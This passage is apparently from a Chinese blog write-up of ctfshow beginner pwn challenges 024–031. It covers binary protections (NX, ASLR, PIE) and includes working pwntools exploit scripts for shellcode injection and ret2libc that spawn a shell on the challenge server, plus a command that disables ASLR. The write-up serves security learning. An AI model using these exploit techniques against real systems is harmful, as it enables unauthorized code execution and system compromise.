函数将该字符串复制到名</span><br><span class="line">为 dest 的缓冲区中。然后，它返回指向 dest 缓冲区的指针 */</span><br></pre></td></tr></table></figure></div><ul><li>当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./pwn aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line">  </span><br><span class="line">flag&#123;just_test_my_process! &#125;</span><br><span class="line">// 本地测试，懒得连远程</span><br></pre></td></tr></table></figure></div><h3 id="024-pwntools-shellcraft"><a class="header-anchor" href="#024-pwntools-shellcraft">¶</a>024 pwntools-shellcraft</h3><ul><li>hint：可以使用pwntools的shellcraft模块来进行攻击</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn024/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">32位  仅开启RELRO保护</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">看汇编</span><br><span class="line">以下是ctfshow函数</span><br><span class="line"></span><br><span class="line">.text:080484C6                 public ctfshow</span><br><span class="line">.text:080484C6 ctfshow         proc near               ; CODE XREF: main+132↓p</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 buf             = byte ptr -88h</span><br><span class="line">.text:080484C6 var_4           = dword ptr -4</span><br><span class="line">.text:080484C6</span><br><span class="line">.text:080484C6 ; __unwind &#123;</span><br><span class="line">.text:080484C6                 push    ebp</span><br><span class="line">.text:080484C7                 mov     ebp, esp</span><br><span class="line">.text:080484C9                 push    ebx</span><br><span class="line">.text:080484CA                 sub     esp, 84h</span><br><span class="line">.text:080484D0                 call    __x86_get_pc_thunk_bx</span><br><span class="line">.text:080484D5                 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.text:080484DB                 sub     esp, 4</span><br><span class="line">.text:080484DE                 push    100h            ; nbytes</span><br><span class="line">.text:080484E3                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484E9                 push    eax             ; buf</span><br><span class="line">.text:080484EA                 push    0               ; fd</span><br><span class="line">.text:080484EC                 call    _read</span><br><span class="line">.text:080484F1                 add     esp, 10h</span><br><span class="line">.text:080484F4                 sub     esp, 0Ch</span><br><span class="line">.text:080484F7                 lea     eax, [ebp+buf]</span><br><span class="line">.text:080484FD                 push    eax             ; s</span><br><span class="line">.text:080484FE                 call    _puts</span><br><span class="line">.text:08048503                 add     esp, 10h</span><br><span class="line">.text:08048506                 lea     eax, [ebp+buf]</span><br><span class="line">.text:0804850C                 call    eax</span><br><span class="line">.text:0804850E                 nop</span><br><span class="line">.text:0804850F                 mov     ebx, [ebp+var_4]</span><br><span class="line">.text:08048512                 leave</span><br><span class="line">.text:08048513                 retn</span><br><span class="line">.text:08048513 ; &#125; // starts at 80484C6</span><br><span class="line">.text:08048513 ctfshow         endp</span><br></pre></td></tr></table></figure></div><ol><li><p>函数开始时进行一些栈操作，保存寄存器的值。</p></li><li><p>调用 __x86_get_pc_thunk_bx 函数，获取当前的指令位置并存储在 ebx 寄存器中。</p></li><li><p>分配 0x84 字节的空间用于缓冲区，存储用户输入的数据。</p></li><li><p>调用 read 函数，从标准输入读取数据，并存储到缓冲区。</p></li><li><p>调用 puts 函数，将缓冲区的内容打印到标准输出。</p></li><li><p>通过调用 call eax 指令，以 eax 寄存器的值作为函数指针，跳转到缓冲区中存储的地址执行。</p></li><li><p>之后是一些清理工作和函数返回的准备操作</p></li></ol><ul><li>这题题目提示了可以使用pwntools的shellcraft模块进行攻击</li><li>shellcraft 模块是 pwntools 库中的一个子模块，用于生成各种不同体系结构的 Shellcode。</li><li>Shellcode 是一段以二进制形式编写的代码，用于利用软件漏洞、执行特定操作或获取系统权限。</li><li>shellcraft 模块提供了一系列函数和方法，用于生成特定体系结构下的 Shellcode</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *	 <span class="comment"># 导入 pwntools 库</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span>		 <span class="comment"># 设置日志级别为调试模式</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;) 		# 本地连接</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28119</span>) 	<span class="comment"># 远程连接</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) 		<span class="comment"># 生成一个 Shellcode</span></span><br><span class="line">io.sendline(shellcode)		 <span class="comment"># 将生成的 Shellcode 发送到目标主机</span></span><br><span class="line">io.interactive()		 <span class="comment"># 与目标主机进行交互</span></span><br></pre></td></tr></table></figure></div><h3 id="025-开启NX保护-ret2libc"><a class="header-anchor" href="#025-开启NX保护-ret2libc">¶</a>025 开启NX保护+ret2libc</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn025/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位  开启NX保护  部分开启RELRO保护</span><br></pre></td></tr></table></figure></div><ul><li>开启NX保护，部分开启RELRO保护 → <code>具体攻击手法为：ret2libc</code></li><li>即先找到<strong>栈溢出</strong>漏洞，通过write函数泄露 write 函数的真实地址，根据<strong>泄露的 write 函数地址</strong>，使用 <strong>LibcSearcher</strong> 来搜索 <strong>libc 库</strong>中相应的函数地址和字符串地址，获取 <strong>system 函数</strong>和**“/bin/sh” 字符串的地址**。构造新的 payload，使用泄露的 system 函数和 “/bin/sh” 字符串的地址来进行<strong>get shell</strong></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment"># 用于漏洞利用</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  <span class="comment"># 用于查找libc版本中的符号地址</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28177</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment"># 创建elf对象</span></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]  <span class="comment"># 获取main函数地址</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># 获取write GOT（全局偏移表）地址</span></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]  <span class="comment"># 获取write PLT（过程链接表）地址</span></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">0</span>) + p32(write_got) + p32(<span class="number">4</span>)  <span class="comment"># 泄漏write函数在libc中的地址。这里使用了cyclic函数生成填充字节，p32函数将地址转换为小端字节序的字节串</span></span><br><span class="line"></span><br><span class="line"> <span class="comment"># 发送payload并接收响应</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">write = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用LibcSearcher类查找与泄漏的write函数地址匹配的libc版本</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算libc库的基地址</span></span><br><span class="line">libc_base = write - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取system和/bin/sh地址</span></span><br><span class="line">system = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># 使用已知的libc基地址和LibcSearcher类来获取system函数和/bin/sh字符串的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造一个新的payload，这次是为了调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system) + p32(main) + p32(bin_sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并等待响应，然后进入交互模式，允许用户与远程shell进行交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><h3 id="026-ASLR-0"><a class="header-anchor" href="#026-ASLR-0">¶</a>026 ASLR 0</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn026/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">64位 开启NX保护  部分开启RELRO保护  PIE未开启</span><br></pre></td></tr></table></figure></div><ul><li><p>ASLR（Address Space Layout Randomization）是一种操作系统级别的安全保护机制，旨在增加软件系统的安全性。</p></li><li><p>它通过**<u>随机化程序在内存中的布局</u><strong>，使得攻击者难以准确地</strong><u>确定关键代码和数据的位</u>**置，从而增加了利用软件漏洞进行攻击的难度</p></li><li><p>开启不同等级会有不同的效果：</p><ol><li><p>内存布局随机化： ASLR的主要目标是随机化程序的内存布局。在传统的内存布局中，不同的库和模块通常会在固定的内存位置上加载，攻击者可以利用这种可预测性来定位和利用漏洞。ASLR通过随机化这些模块的加载地址，使得攻击者无法准确地确定内存中的关键数据结构和代码的位置。</p></li><li><p>地址空间范围的随机化： ASLR还会随机化进程的地址空间范围。在传统的地址空间中，栈、堆、代码段和数据段通常会被分配到固定的地址范围中。ASLR会随机选择地址空间的起始位置和大小，从而使得这些重要的内存区域在每次运行时都有不同的位置。</p></li><li><p>随机偏移量： ASLR会引入随机偏移量，将程序和模块在内存中的相对位置随机化。这意味着每个模块的实际地址是相对于一个随机基址偏移的，而不是绝对地址。攻击者需要在运行时发现这些偏移量，才能准确地定位和利用漏洞。</p></li><li><p>堆和栈随机化： ASLR也会对堆和栈进行随机化。堆随机化会在每次分配内存时选择不同的起始地址，使得攻击者无法准确地预测堆上对象的位置。栈随机化会随机选择栈帧的起始位置，使得攻击者无法轻易地覆盖返回地址或控制程序流程</p></li></ol></li><li><p>在Linux中，ALSR的全局配置/proc/sys/kernel/randomize_va_space有三种情况：</p><ul><li>0表示关闭ALSR</li><li>1表示部分开启（将mmap的基址、stack和vdso页面随机化）</li><li>2表示完全开启</li></ul></li></ul><table><thead><tr><th>alsr</th><th>executable</th><th>plt</th><th>heap</th><th>stack</th><th>shared libraries</th></tr></thead><tbody><tr><td>0</td><td>x</td><td>x</td><td>x</td><td>x</td><td>x</td></tr><tr><td>1</td><td>x</td><td>x</td><td>x</td><td>√</td><td>√</td></tr><tr><td>2</td><td>x</td><td>x</td><td>√</td><td>√</td><td>√</td></tr><tr><td>2+PIE</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">./pwn</span><br><span class="line"></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">&gt;&gt;&gt; 2</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">&gt;&gt;&gt; 0</span><br><span class="line"></span><br><span class="line">./pwn</span><br><span class="line">得到真的flag</span><br></pre></td></tr></table></figure></div><h3 id="027-ASLR-0-1"><a class="header-anchor" href="#027-ASLR-0-1">¶</a>027 ASLR 0/1</h3><ul><li>详细分析同026</li></ul><h3 id="028-ASLR-2"><a class="header-anchor" href="#028-ASLR-2">¶</a>028 ASLR 2</h3><ul><li>此时不管等级为0 1 2 ，函数本身地址不会变化（在未开启PIE的情况下）</li><li>详细分析同026</li></ul><h3 id="029-ASLR和PIE都开启"><a class="header-anchor" href="#029-ASLR和PIE都开启">¶</a>029 ASLR和PIE都开启</h3><ul><li>ASLR和PIE开启后，地址都会将随机化</li><li>这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构</li><li>也就是相对偏移是不会变化的</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">./pwn</span><br><span class="line"></span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Please confirm your ASLR level first !                  </span><br><span class="line">    * *************************************                           </span><br><span class="line">sh: 1: cannot create /proc/sys/kernel/randomize_va_space: Permission denied</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line"></span><br><span class="line">Let&#x27;s take a look at protection:</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn029/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">executable: 0x5585483d383a</span><br><span class="line">system@plt: 0x7f8a6ad62420</span><br><span class="line">heap: 0x558549735260</span><br><span class="line">stack: 0x7ffc4481e7c4</span><br><span class="line"></span><br><span class="line">As you can see, the protection has been fully turned on and the address has been completely randomized!</span><br><span class="line"></span><br><span class="line">Here is your flag:</span><br><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure></div><h3 id="030-PIE关闭"><a class="header-anchor" href="#030-PIE关闭">¶</a>030 PIE关闭</h3><ul><li>关闭PIE</li><li>程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn030/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">32位  PIE关闭  开启NX  部分开启RELRO保护</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048710);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048784);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048800);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804888C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804891C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489A0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : No Canary found &amp; No PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xE</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* buf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准输入。第二个参数是指向存储数据的缓冲区的指针，这里是 &amp;buf 。第三个参数是要读取的最大字节数，这里是 0x100u ，即 256 字节</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">程序中无system也没有“/bin/sh”字符串，也可以使用ret2libc的方法进行get shell 后面到该部分会进行详细讲解，同样在这里仅仅是为了演示在关闭Canary和PIE保护，开启NX保护时的一种攻击手法</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28145</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)  <span class="comment"># 创建elf对象</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;</span>)</span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]  <span class="comment"># 获取ctfshow函数的地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload以泄露write函数在libc中的地址</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">140</span> +p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)  <span class="comment"># 不是很懂。。</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用泄漏的write地址来确定libc基地址，进而计算system函数和/bin/sh字符串的地址</span></span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造新的payload，这次是调用system函数并传递/bin/sh作为参数</span></span><br><span class="line">payload2 = <span class="string">&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><ul><li>这题没太懂。</li><li>还差点前置知识喵。</li></ul><h3 id="031-ALSR和PIE开启"><a class="header-anchor" href="#031-ALSR和PIE开启">¶</a>031 ALSR和PIE开启</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/ctfshow-pwn-primary/pwn031/pwn&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">32位  仅关闭Canary保护</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);  <span class="comment">// 程序先打印出main函数的地址</span></span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_854);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8C8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_944);</span><br><span class="line">  <span class="built_in">puts</span>(asc_9D0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A60);</span><br><span 